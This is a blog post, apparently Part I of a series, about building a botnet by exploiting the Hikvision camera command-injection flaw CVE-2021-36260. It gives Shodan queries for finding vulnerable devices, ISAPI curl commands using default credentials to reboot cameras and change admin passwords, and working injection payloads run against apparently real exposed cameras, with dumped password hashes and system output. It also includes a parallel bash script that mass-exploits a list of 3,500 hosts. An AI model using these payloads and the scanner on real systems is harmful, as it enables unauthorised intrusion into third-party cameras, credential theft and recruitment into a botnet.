---
title: RCE2Botnet4Fun - Part I
date: 2025-07-26 14:54:00 +/-TTTT
image:
  path: assets/img/favicons/cam.jpg
  class: "img-right"
categories: [CyberSecurity]
tags: [iot, web, researching]  
---

# Hikvision - RCE2Botnet4Fun

***

## Introduction

In this write-up, I document the process of building my own custom botnet framework, starting with exploitation of Hikvision’s unauthenticated RCE vulnerability [CVE-2021-36260](https://github.com/advisories/GHSA-v276-9v2g-hx55). The attack vector abuses a vulnerable `PUT` request to the `/SDK/webLanguage` endpoint, where XML payloads can inject shell commands due to poor input handling in the firmware. After confirming command execution on exposed devices (discovered via Shodan), I built out core functionality: remote shell execution, device fingerprinting (e.g., `cpuinfo`, `ifconfig`, etc.), and automated enumeration. I then scripted a Bash-based scanner to test thousands of IP:PORT pairs in parallel, identifying vulnerable targets at scale. This project forms the base for a self-written RCE-powered botnet system, created entirely for research, exploration, and proof-of-concept development in a controlled environment.

***

## HikvisionExploiter

Last year, I developed a Python tool ([HikvisionExploiter](https://github.com/tamim1089/HikvisionExploiter)) that’s worth mentioning as the foundational starting point for the RCE2Botnet project. It automates scanning and exploiting Hikvision devices running the vulnerable web interface firmware version `3.1.3_150324` (CVE-2021-36260). The tool processes a list of IP:port targets, checks for accessible snapshot directories to confirm unauthenticated access, then downloads timestamped snapshots to build a visual profile. It extracts device and user information by parsing XML responses from specific API endpoints, and retrieves the encrypted configuration file—decrypting it using AES-ECB and XOR methods—to reveal internal settings and credentials. Built-in CVE checks with various header and payload bypasses quickly identify exploitable devices. With support for batch targets, detailed logging, and graceful interruption handling, this tool laid the groundwork for automating mass reconnaissance and validation of remote code execution, critical steps toward building the RCE2Botnet infrastructure.

***

## Explaining [CVE-2021-36260](https://github.com/advisories/GHSA-v276-9v2g-hx55)

This vulnerability comes down to a classic case of poor input validation right inside Hikvision’s proprietary HTTP server binary often referred to as _davinci_. Researchers reverse‑engineered firmware and discovered that when handling a `PUT /SDK/webLanguage` call, the server reads the `<language>` XML element and plugs that string directly into a C `snprintf` call whose format string is `/dav/%s.tar.gz`. That buffer is only 31 bytes long, including fixed overhead, so anything longer gets truncated or overflows, or worse, if validation is missing, you can craft a payload like `$(ls /)` inside the `<language>` and it becomes part of a shell invocation via `system()`. That’s where unauthenticated hacker lands root shell access.

Digging into how the target firmware pieces behave, engineers found the code path: `davinci` calls `snprintf(buf, 0x1f, "/dav/%s.tar.gz", user_input)` then later builds a tar command like `/bin/sh -c tar zxf buf -C /home/`. If you inject payload content into `user_input`, `system()` executes it. Some firmware variations limit input to shorter length but others observed in the wild allow more space. That inconsistency explains why exploits sometimes need fuzzing around size boundaries. ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-36260?utm_source=chatgpt.com), [watchfulip.github.io](https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html?utm_source=chatgpt.com)). From the reverse engineering of Moobot’s downloader stage, analysts saw that once RCE is triggered, the attacker crafts a tiny ARM ELF binary (32‑bit LSB) called `downloader`. Its job is to fetch a larger Moobot implant from a remote HTTP server, verify it by printing “RAY” on success, then execute it with parameter `hikivision`. The downloader self‑cleans any existing “macHelper” file, drops the new one, and even aliases common commands like `reboot` to disable device recovery attempts.

***

### Find Targets on Shodan :  `3.1.3.150324`&#x20;

Using the Shodan query `3.1.3.150324` filters devices exposing the Hikvision web interface running firmware version `3.1.3_150324`, which is part of the vulnerable range affected by [CVE-2021-36260](https://github.com/advisories/GHSA-v276-9v2g-hx55). This version reflects the internal web server (`/SDK/webLanguage`) known to be exploitable due to command injection. Devices matching this string are strong candidates for successful RCE.

<figure><img src="https://4146235939-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVsJVX5kOfAZOe1840NhZ%2Fuploads%2FGWourVA6YK36rYbjYSy2%2Fimage.png?alt=media&#x26;token=e96b2c01-b5bb-4395-b6a4-5263e0dfbe9e" alt=""><figcaption></figcaption></figure>

### Second Option For Shodan ( More General ) : `hikvision`&#x20;

***


## Exposed APIs

**Hikvision devices expose an undocumented but widely reverse engineered HTTP API**, used by their web interface, mobile apps, and some SDKs. You can absolutely interact with it from the CLI using tools like `curl`. These APIs, known as **ISAPI**, operate over plain HTTP(S) and return XML (or JSON on newer firmware). Most endpoints require **basic or digest auth** and respond with structured device control logic.

***

### Authentication

Default auth:

```bash
curl -u admin:12345 http://<ip>/ISAPI/System/deviceInfo
```

Some endpoints may use **digest auth**:

```bash
curl --digest -u admin:12345 http://<ip>/ISAPI/Security/users
```

***

### Example Interactions

#### Get Device Info

```bash
curl -u admin:12345 http://<ip>/ISAPI/System/deviceInfo
```

#### Reboot Device

```bash
curl -u admin:12345 -X PUT http://<ip>/ISAPI/System/reboot
```

#### List Users

```bash
curl -u admin:12345 http://<ip>/ISAPI/Security/users
```

#### Change Admin Password

```bash
curl -u admin:12345 -X PUT http://<ip>/ISAPI/Security/users/1 -d '
<User>
  <id>1</id>
  <userName>admin</userName>
  <password>NewStrongPassword</password>
</User>'
```

#### Get Snapshot (JPEG)

```bash
curl -u admin:12345 http://<ip>/ISAPI/Streaming/channels/1/picture
```

#### Live Event Stream (Motion, Alerts)

```bash
curl -u admin:12345 http://<ip>/ISAPI/Event/notification/alertStream
```

***

### API Endpoint Reference

<table><thead><tr><th>Function</th><th width="112.45458984375">Method</th><th>Endpoint</th><th>Notes</th></tr></thead><tbody><tr><td>Get device info</td><td>GET</td><td><code>/ISAPI/System/deviceInfo</code></td><td>Model, firmware, serial</td></tr><tr><td>Reboot device</td><td>PUT</td><td><code>/ISAPI/System/reboot</code></td><td>Admin only</td></tr><tr><td>List users</td><td>GET</td><td><code>/ISAPI/Security/users</code></td><td>Returns full user list</td></tr><tr><td>Modify user</td><td>PUT</td><td><code>/ISAPI/Security/users/&#x3C;id></code></td><td>XML payload</td></tr><tr><td>Get snapshot</td><td>GET</td><td><code>/ISAPI/Streaming/channels/1/picture</code></td><td>Image stream, snapshot mode</td></tr><tr><td>Event stream</td><td>GET</td><td><code>/ISAPI/Event/notification/alertStream</code></td><td>Multipart XML + JPEG</td></tr><tr><td>Get interfaces</td><td>GET</td><td><code>/ISAPI/System/Network/interfaces</code></td><td>Network config</td></tr><tr><td>Firmware upgrade</td><td>PUT</td><td><code>/ISAPI/System/updateFirmware</code> (upload <code>.dav</code>)</td><td>Needs firmware binary</td></tr><tr><td>ISP mode control</td><td>PUT</td><td><code>/ISAPI/Image/channels/1/ISPMode</code></td><td>For switching day/night</td></tr><tr><td>ANPR trigger</td><td>GET</td><td><code>/ISAPI/Traffic/MNPR/channels/1?laneNo=1&#x26;OSD=1</code></td><td>License plate capture</td></tr></tbody></table>

***

### Tips

* Endpoints return **XML** by default. Use `-H "Accept: application/xml"` for clarity.
* Unauthorized? Try both basic and digest auth. Some firmwares toggle between them.
* Discover endpoints by sniffing traffic with Burp or browser dev tools when using the web interface.

***


## RCE Thru Curl :

Initial exploitation began by selecting targets from Shodan search results using the query `3.1.3.150324`, which yields Hikvision devices exposing the vulnerable `/SDK/webLanguage` endpoint. A crafted HTTP `PUT` request was sent with `Content-Type: application/x-www-form-urlencoded; charset=UTF-8`, injecting command execution payloads via XML input like `<?xml version="1.0"?><language>$(COMMAND)</language>`, exploiting the unsanitized input processing in CVE-2021-36260. Successful execution was verified by chaining the payload with a subsequent `curl` request to retrieve command output (e.g., dumping `/etc/passwd`, `ifconfig`, or directory listings) from a predictable location (`/webLib/x`) on the target, confirming unauthenticated RCE on multiple devices.

### Basic Enumerating On a random target:

```bash
 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 0s
 ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
           -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
           --data '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /etc/passwd > webLib/x)</language>' \
           > /dev/null && curl -s "http://IP:82/x"

root:$1$yi$R2PYdRrGOlLVVIaehmYwl.:0:0:root:/root/:/bin/sh
admin:$1$yi$R2PYdRrGOlLVVIaehmYwl.:0:0:root:/:/bin/sh

 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 1s
 ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
           -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
           --data '<?xml version="1.0" encoding="UTF-8"?><language>$(ifconfig > webLib/x)</language>' \
           > /dev/null && curl -s "http://IP:82/x"

eth0      Link encap:Ethernet  HWaddr 28:57:BE:5E:0E:7F  
          inet addr:192.168.1.65  Bcast:192.168.1.255  Mask:255.255.255.0
          inet6 addr: fe80::2a57:beff:fe5e:e7f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:8908 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3616931 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1329113 (1.2 MiB)  TX bytes:981880399 (936.3 MiB)
          Interrupt:12 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.255.255.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:270 errors:0 dropped:0 overruns:0 frame:0
          TX packets:270 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:16926 (16.5 KiB)  TX bytes:16926 (16.5 KiB)


 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 1s
 ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
           -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
           --data '<?xml version="1.0" encoding="UTF-8"?><language>$(ls / > webLib/x)</language>' \
           > /dev/null && curl -s "http://IP:82/x"

bin
dav
dev
devinfo
etc
home
init
lib
linuxrc
mnt
opt
proc
root
sbin
srv
sys
tmp
var

 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 6s
 ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
           -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
           --data '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /proc/version > webLib/x)</language>' \
           > /dev/null && curl -s "http://IP:82/x"

Linux version 3.0.8 (huangliangyf2@Cpl-Frt-BSP) #1 Fri Mar 20 20:52:46 CST 2015

 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 4s
 ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
           -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
           --data '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /proc/cpuinfo > webLib/x)</language>' \
           > /dev/null && curl -s "http://IP:82/x"

Processor	: ARM926EJ-S rev 5 (v5l)
BogoMIPS	: 218.72
Features	: swp half thumb fastmult edsp java 
CPU implementer	: 0x41
CPU architecture: 5TEJ
CPU variant	: 0x0
CPU part	: 0x926
CPU revision	: 5

Hardware	: r2
Revision	: 0000
Serial		: 0000000000000000

 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 5s
 ╰─λ 

 
```

***

## Automation For Testing vulnerability

As we have a list of 3500 hosts, it would be insanity to test it manually, so we will use an automation optimized for speed bash script to test the vulnerable ones.

```bash
#!/bin/bash

# function to process each IP:PORT
process_host() {
    local IP=$1
    local PORT=$2
    
    echo "Trying $IP:$PORT"

    # inject payload
    if curl -s -m 5 -X PUT "http://$IP:$PORT/SDK/webLanguage" \
        -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
        --data '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /etc/passwd > webLib/x)</language>' \
        > /dev/null 2>&1; then
        echo "  Payload sent successfully to $IP:$PORT"
    else
        echo "  Payload timeout/error for $IP:$PORT"
    fi

    # try to retrieve the dumped file
    response=$(curl -s -m 3 "http://$IP:$PORT/x" 2>/dev/null)
    if [ -n "$response" ]; then
        echo "  Retrieved data from $IP:$PORT:"
        echo "Injecting Backdoor..."
        echo "$response"
    else
        echo "  No data retrieved from $IP:$PORT (timeout/no file)"
    fi
    echo ""
}

# export the function so its available to subshells
export -f process_host

# read all IP:PORT pairs and run them in parallel
while IFS=: read -r IP PORT; do
    # Run each host processing in background
    process_host "$IP" "$PORT" &
done < pizza.txt

# wait for all background processes to complete
wait

echo "all scans completed"
```

#### Automated Bash One Liner for grepping the clear results from the XML non-sense

```bash
./final.sh | grep "root:" -B 2 -A 1 > finalvulnerablercehosts.txt
```

## Output Video :

<iframe width="560" height="315" 
        src="https://www.youtube.com/embed/zbG_Qyr-K3I" 
        title="YouTube video player" frameborder="0" 
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
        allowfullscreen>
</iframe>


***

## To be Continued....

***

### Resources Used :

* [https://seclists.org/fulldisclosure/2017/Sep/23](https://seclists.org/fulldisclosure/2017/Sep/23)
* [https://cxsecurity.com/issue/WLB-2024040061](https://cxsecurity.com/issue/WLB-2024040061)
* [https://busybox.net/downloads/BusyBox.html](https://busybox.net/downloads/BusyBox.html)
* [https://github.com/tamim1089/HikvisionExploiter/](https://github.com/tamim1089/HikvisionExploiter/)
* [https://www.fortinet.com/blog/threat-research/mirai-based-botnet-moobot-targets-hikvision-vulnerability](https://www.fortinet.com/blog/threat-research/mirai-based-botnet-moobot-targets-hikvision-vulnerability)
* [https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-36260.yaml](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-36260.yaml)
